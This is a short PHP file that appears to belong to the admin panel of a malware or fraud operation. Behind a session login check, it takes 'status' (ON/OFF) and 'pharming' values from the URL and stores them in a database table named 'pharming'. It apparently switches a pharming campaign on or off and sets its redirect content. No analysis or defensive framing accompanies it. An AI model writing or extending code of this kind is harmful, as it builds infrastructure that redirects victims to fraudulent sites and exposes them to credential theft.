<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php
require_once('../../includes.php');

if( $_GET['status'] == "ON" ){
	$status = "Pharming.ON" ;
}
if( $_GET['status'] == "OFF" ){
	$status = "Pharming.OFF" ;
}
if( $_GET['status'] == "SIN" ){
	$status = "Pharming.NOT" ;
}

if( isset($_GET['pharming']) && !empty($_GET['pharming']) ){

    $PharmingTxt = $_GET['pharming'] ;

    $Datos = array ('pharming' => $PharmingTxt , 'status' => $status);
	$UpdateBuscar = array('id' => 1) ;
	$Result = $DB->Update('pharming' , false , $Datos , $UpdateBuscar) ;
	echo $Result['msg'] ;


}

?>